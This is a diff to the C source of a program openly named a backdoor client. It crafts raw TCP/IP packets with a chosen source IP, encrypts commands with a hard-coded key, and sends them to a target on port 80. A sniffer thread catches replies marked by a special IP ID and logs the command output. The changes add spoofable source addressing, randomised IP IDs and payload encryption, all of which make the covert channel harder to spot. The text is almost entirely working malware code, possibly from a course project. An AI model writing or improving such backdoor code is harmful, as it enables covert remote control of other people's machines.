@@ -3,30 +3,28 @@
  */
 
 #include "client.h"
+#include "util.h"
 
 int main (int argc, char* argv[]) {
 
-	int ipaddress;
+	int srcip, destip;
 
-	ipaddress = host_convert(argv[1]);
+	// convert source ip to binary
+	srcip = host_convert(argv[1]);
 
-	backdoor_client((uint32)ipaddress, argv[2]);
+	//convert destination ip to binary
+	destip = host_convert(argv[2]);
+
+	backdoor_client((uint32)srcip, (uint32)destip ,argv[3]);
 
 	return 0;
 }
 
-void backdoor_client(uint32 ipaddress, char* protocol)
+void backdoor_client(uint32 srcip, uint32 destip, char* protocol)
 {
 	client *cln;
 	char *cmd;
 	pthread_t pth_id;
-	//int ipaddress;
-
-
-	// pcap variables to determine source IP
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t *pd;
-	uint32_t srcip, netmask;
 
 	// Can they run this?
 	if (geteuid() != 0) {
@@ -36,7 +34,7 @@ void backdoor_client(uint32 ipaddress, char* protocol)
 	}
 
 	// Check for correct arguments, and provide them with a usage.
-	if(ipaddress == 0) {
+	if((srcip == 0) && (destip == 0)) {
 		perror("Invalid IP Address");
 	}
 
@@ -45,35 +43,17 @@ void backdoor_client(uint32 ipaddress, char* protocol)
 		perror("Invalid Protocol");
 	}
 
-	pthread_create(&pth_id, NULL, sniffer_thread, "wlp2s0");
-
-	// open the device for live capture
-	if ((pd = pcap_open_live("wlp2s0", BUFSIZ, 1, 0, errbuf)) == NULL) {
-		printf("pcap_open_live(): %s\n", errbuf);
-		exit(1);
-	}
-
-	// get network device source IP address and netmask
-	if (pcap_lookupnet("wlp2s0", &srcip, &netmask, errbuf) < 0) {
-		printf("pcap_lookupnet(): %s\n", errbuf);
-		exit(1);
-
-	}
-
-	char * addr;
-	inaddr.s_addr = (unsigned long)srcip;
-	addr = inet_ntoa(inaddr);
-	printf("sock addr IP: %s \n", addr);
+	pthread_create(&pth_id, NULL, sniffer_thread, NETWORK_CARD);
 
 	cln = client_new(); 			// create and initialize a new client struct
 
 	// set client structure
 	cln->source_host = srcip;
-	cln->source_port = 4098;
-	cln->dest_host = ipaddress;
+	cln->source_port = CMD_PORT;
+	cln->dest_host = destip;
 	cln->dest_port = 80;
 
-	printf("source ip %u, dest ip: %u \n", srcip, ipaddress);
+	printf("source ip %u, dest ip: %u \n", srcip, destip);
 
 	/**
 	 * Print out destination host information
@@ -108,13 +88,16 @@ void backdoor_client(uint32 ipaddress, char* protocol)
 client *client_new(void) {
 	client *c = malloc(sizeof(client));
 	c->source_host = 0;
-	c->source_port = 2001;
+	c->source_port = 0;
 	c->dest_host = 0;
 	c->dest_port = 80; 	// DEFAULT PORT TO SEND PACKETS TO
 	return c;
 }
 
 void packet_new(client *c, char *msg) {
+
+	int randomID = 0;
+
 	packets.ip.version = 4;
 	packets.ip.ihl = 5;
 	packets.ip.tos = 0;
@@ -148,7 +131,7 @@ void packet_new(client *c, char *msg) {
 
 	// Add the data to the datagram
 	// encrypt data
-	//msg = (char *)xor_encrypt(msg);
+	encrypt(SEKRET, msg, sizeof(msg));
 	strcpy(packets.data, msg);
 
 	packets.tcp.source = htons(c->source_port);
@@ -157,7 +140,9 @@ void packet_new(client *c, char *msg) {
 
 	packets.tcp.seq = 1 + (int) (10000.0 * rand() / (RAND_MAX + 1.0));
 
-	packets.ip.id = htons(50001);
+	randomID = randomRange(5000, 5050);
+	packets.ip.id = htons(randomID);
+
 
 	packets.ip.tot_len = ((4 * packets.ip.ihl) + (4 * packets.tcp.doff)
 			+ strlen(packets.data));
@@ -303,14 +288,13 @@ void parse_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet) {
 		return;
 	}
 
-	// hex of boss 626f7373
 	if (ntohs(iphdr->id) == 5002) {
 		file = fopen("results.log", "a+");
 		tcp_payload = (char *) (packet + sizeof(struct ether_header) + size_ip
 				+ size_tcp);
 
 		// decrypt payload
-		//tcp_payload = (char *)xor_decrypt(tcp_payload);
+		//tcp_payload = decrypt();
 		fprintf(file, "Command Response: \n\n%s\n", tcp_payload);
 		fprintf(file,"==================================================================\n\n");
 
@@ -332,5 +316,11 @@ unsigned int host_convert(char *hostname) {
 		bcopy(h->h_addr, (char *) &i.s_addr, h->h_length);
 	}
 	return i.s_addr;
+}
+
+int randomRange(int Min, int Max)
+{
+    int diff = Max-Min;
+    return (int) (((double)(diff+1)/RAND_MAX) * rand() + Min);
 }
 
